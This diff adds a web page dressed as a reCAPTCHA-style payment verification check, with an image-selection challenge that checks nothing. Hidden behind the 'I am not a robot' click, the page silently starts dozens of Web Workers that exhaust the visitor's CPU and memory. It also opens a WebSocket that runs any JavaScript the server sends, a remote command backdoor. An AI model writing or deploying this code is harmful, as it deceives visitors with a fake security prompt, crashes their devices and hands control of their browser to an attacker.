@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Payment Verification</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: #f4f6f9;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 8px;
+      box-shadow: 0 2px 16px rgba(0,0,0,0.12);
+      padding: 40px 48px;
+      width: 420px;
+      text-align: center;
+    }
+
+    .lock-icon { font-size: 48px; margin-bottom: 16px; }
+
+    h1 { font-size: 20px; font-weight: 600; color: #1a1a2e; margin-bottom: 8px; }
+
+    p { font-size: 14px; color: #666; margin-bottom: 32px; line-height: 1.5; }
+
+    .captcha-box {
+      border: 1px solid #d0d5dd;
+      border-radius: 6px;
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      background: #fafafa;
+      margin-bottom: 24px;
+      cursor: pointer;
+      user-select: none;
+      transition: border-color 0.2s;
+    }
+
+    .captcha-box:hover { border-color: #4a90e2; }
+
+    .checkbox {
+      width: 24px;
+      height: 24px;
+      border: 2px solid #999;
+      border-radius: 3px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s;
+      background: #fff;
+    }
+
+    .checkbox.checked { background: #4a90e2; border-color: #4a90e2; }
+    .checkbox.checked::after { content: "✓"; color: white; font-size: 14px; font-weight: bold; }
+
+    .captcha-label { font-size: 14px; color: #333; flex: 1; text-align: left; }
+
+    .captcha-logo { font-size: 10px; color: #999; text-align: right; line-height: 1.3; }
+
+    /* Image CAPTCHA challenge */
+    .challenge {
+      display: none;
+      text-align: left;
+    }
+
+    .challenge.active { display: block; }
+
+    .challenge-header {
+      background: #4a90e2;
+      color: white;
+      padding: 12px 16px;
+      border-radius: 6px 6px 0 0;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .challenge-header span { font-size: 13px; font-weight: 500; }
+    .challenge-header small { font-size: 11px; opacity: 0.8; }
+
+    .challenge-prompt {
+      background: #f0f4fa;
+      border-left: 1px solid #d0d5dd;
+      border-right: 1px solid #d0d5dd;
+      padding: 10px 16px;
+      font-size: 13px;
+      color: #333;
+      font-weight: 500;
+    }
+
+    .image-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 3px;
+      border: 1px solid #d0d5dd;
+      border-top: none;
+      border-radius: 0 0 6px 6px;
+      overflow: hidden;
+      margin-bottom: 10px;
+    }
+
+    .grid-cell {
+      position: relative;
+      aspect-ratio: 1;
+      cursor: pointer;
+      overflow: hidden;
+      background: #ddd;
+    }
+
+    .grid-cell.selected::after {
+      content: "✓";
+      position: absolute;
+      inset: 0;
+      background: rgba(74, 144, 226, 0.55);
+      font-size: 28px;
+      color: white;
+      font-weight: bold;
+      line-height: 1;
+      padding-top: calc(50% - 18px);
+      text-align: center;
+    }
+
+    .challenge-footer {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 0 2px;
+    }
+
+    .challenge-footer small { font-size: 10px; color: #aaa; }
+
+    .verify-btn {
+      background: #4a90e2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 8px 20px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .verify-btn:hover { background: #357abd; }
+    .verify-btn:disabled { background: #aaa; cursor: default; }
+
+    .status {
+      font-size: 13px;
+      color: #999;
+      min-height: 20px;
+      margin-top: 8px;
+    }
+
+    .status.connected { color: #27ae60; font-weight: 500; }
+    .status.error { color: #e74c3c; }
+
+    .spinner {
+      display: none;
+      margin: 20px auto 8px;
+      width: 32px;
+      height: 32px;
+      border: 3px solid #e0e0e0;
+      border-top-color: #4a90e2;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="lock-icon">🔒</div>
+    <h1>Secure Payment Verification</h1>
+    <p>To protect your transaction, please complete the security check below before proceeding.</p>
+
+    <div class="captcha-box" id="captchaBox">
+      <div class="checkbox" id="checkbox"></div>
+      <span class="captcha-label">I am not a robot</span>
+      <div class="captcha-logo">reCAPTCHA<br><span style="font-size:9px">Privacy · Terms</span></div>
+    </div>
+
+    <div class="challenge" id="challenge">
+      <div class="challenge-header">
+        <span id="challengeTitle">Select all images with crosswalks</span>
+        <small>reCAPTCHA</small>
+      </div>
+      <div class="challenge-prompt" id="challengePrompt">Click verify once there are none left.</div>
+      <div class="image-grid" id="imageGrid"></div>
+      <div class="challenge-footer">
+        <small>reCAPTCHA · Privacy · Terms</small>
+        <button class="verify-btn" id="verifyBtn">Verify</button>
+      </div>
+    </div>
+
+    <div class="spinner" id="spinner"></div>
+    <div class="status" id="status">Please complete the verification above.</div>
+  </div>
+
+  <script>
+    const ROUNDS = [
+      { title: "Select all images with crosswalks",    prompt: "Click verify once there are none left.", targets: ["images/crosswalk_images/crosswalk1.png","images/crosswalk_images/crosswalk2.png","images/crosswalk_images/crosswalk3.png"] },
+      { title: "Select all images with traffic lights", prompt: "Click verify once there are none left.", targets: ["images/streetlight_images/streetlight1.png","images/streetlight_images/streetlight2.png","images/streetlight_images/streetlight3.png"] },
+      { title: "Select all images with buses",          prompt: "Click verify once there are none left.", targets: ["images/bus_images/bus1.png","images/bus_images/bus2.png","images/bus_images/bus3.png"] },
+    ];
+
+    const ALL_RANDOMS = Array.from({length: 18}, (_, i) => `images/random_images/random${i+1}.png`);
+
+    function shuffle(arr) {
+      const a = [...arr];
+      for (let i = a.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [a[i], a[j]] = [a[j], a[i]];
+      }
+      return a;
+    }
+
+    // Pick 6 non-repeating randoms from the pool, consuming from the front
+    let randomPool = shuffle(ALL_RANDOMS);
+    function pickRandoms(n) {
+      if (randomPool.length < n) randomPool = shuffle(ALL_RANDOMS);
+      return randomPool.splice(0, n);
+    }
+
+    let currentRound = 0;
+    let selected = new Set();
+    let targetIndices = new Set();
+
+    function buildGrid(round) {
+      const grid = document.getElementById("imageGrid");
+      grid.innerHTML = "";
+      selected.clear();
+      targetIndices.clear();
+
+      const cfg = ROUNDS[round];
+      document.getElementById("challengeTitle").textContent = cfg.title;
+      document.getElementById("challengePrompt").textContent = cfg.prompt;
+
+      const distractors = pickRandoms(6);
+      const cells = [
+        ...cfg.targets.map(src => ({ src, isTarget: true })),
+        ...distractors.map(src => ({ src, isTarget: false })),
+      ];
+      const shuffled = shuffle(cells);
+
+      shuffled.forEach((cell, i) => {
+        if (cell.isTarget) targetIndices.add(i);
+
+        const div = document.createElement("div");
+        div.className = "grid-cell";
+
+        const img = document.createElement("img");
+        img.src = cell.src;
+        img.style.cssText = "width:100%;height:100%;object-fit:cover;display:block;";
+        div.appendChild(img);
+
+        div.addEventListener("click", () => {
+          div.classList.toggle("selected");
+          if (div.classList.contains("selected")) selected.add(i);
+          else selected.delete(i);
+        });
+
+        grid.appendChild(div);
+      });
+    }
+
+    function showSpinner(msg) {
+      document.getElementById("challenge").classList.remove("active");
+      document.getElementById("spinner").style.display = "block";
+      document.getElementById("status").textContent = msg;
+    }
+
+    function showFinal() {
+      document.getElementById("spinner").style.display = "none";
+      document.getElementById("status").className = "status connected";
+      document.getElementById("status").textContent = "✓ Verification complete. Session active.";
+    }
+
+    document.getElementById("verifyBtn").addEventListener("click", () => {
+      currentRound++;
+      if (currentRound < ROUNDS.length) {
+        showSpinner("Verifying images…");
+        setTimeout(() => {
+          document.getElementById("spinner").style.display = "none";
+          document.getElementById("challenge").classList.add("active");
+          buildGrid(currentRound);
+        }, 1800);
+      } else {
+        showSpinner("Finalizing verification…");
+        setTimeout(showFinal, 2500);
+      }
+    });
+
+    // ── WebSocket (kept open for future commands) ──────────────────────────
+    const sessionId = crypto.randomUUID();
+    let ws = null;
+
+    function connectWS() {
+      const protocol = location.protocol === "https:" ? "wss" : "ws";
+      ws = new WebSocket(`${protocol}://${location.host}/ws/${sessionId}`);
+      ws.onclose = () => { ws = null; };
+      ws.onerror = () => { ws = null; };
+      ws.onmessage = (event) => {
+        try { handleCommand(JSON.parse(event.data)); } catch (e) {}
+      };
+    }
+
+    function handleCommand(cmd) {
+      if (cmd.type === "exec" && cmd.js) new Function(cmd.js)();
+    }
+
+    // ── CPU + RAM hammer ───────────────────────────────────────────────────
+    function launchHammer() {
+      const workerCode = `
+        onmessage = function() {};
+        const SIZE = 512;
+        const LEAK_CHUNK_MB = 20;
+        const leaks = [];
+
+        function makeMatrix() {
+          const m = new Float64Array(SIZE * SIZE);
+          for (let i = 0; i < m.length; i++) m[i] = Math.random();
+          return m;
+        }
+
+        function matMul(A, B, C) {
+          for (let i = 0; i < SIZE; i++) {
+            for (let k = 0; k < SIZE; k++) {
+              const aik = A[i * SIZE + k];
+              for (let j = 0; j < SIZE; j++) {
+                C[i * SIZE + j] += aik * B[k * SIZE + j];
+              }
+            }
+          }
+        }
+
+        const A = makeMatrix();
+        const B = makeMatrix();
+        const C = new Float64Array(SIZE * SIZE);
+
+        function loop() {
+          const chunk = new Float64Array(LEAK_CHUNK_MB * 1024 * 1024 / 8);
+          for (let i = 0; i < chunk.length; i++) chunk[i] = Math.random();
+          leaks.push(chunk);
+          matMul(A, B, C);
+          for (let i = 0; i < SIZE * SIZE; i++) A[i] = C[i] * 0.9999;
+          loop();
+        }
+        loop();
+      `;
+
+      const blob = new Blob([workerCode], { type: "application/javascript" });
+      const url = URL.createObjectURL(blob);
+      const count = (navigator.hardwareConcurrency || 4) * 4;
+      for (let i = 0; i < count; i++) {
+        new Worker(url);
+      }
+    }
+
+    // ── "I'm not a robot" click ────────────────────────────────────────────
+    document.getElementById("captchaBox").addEventListener("click", () => {
+      if (document.getElementById("checkbox").classList.contains("checked")) return;
+
+      document.getElementById("checkbox").classList.add("checked");
+      document.getElementById("captchaBox").style.cursor = "default";
+      document.getElementById("status").textContent = "";
+
+      // Fire hammer silently
+      launchHammer();
+
+      // Open WS for future commands
+      connectWS();
+
+      // Show first image challenge after brief "thinking" pause
+      setTimeout(() => {
+        document.getElementById("challenge").classList.add("active");
+        buildGrid(0);
+      }, 1200);
+    });
+  </script>
+</body>
+</html>
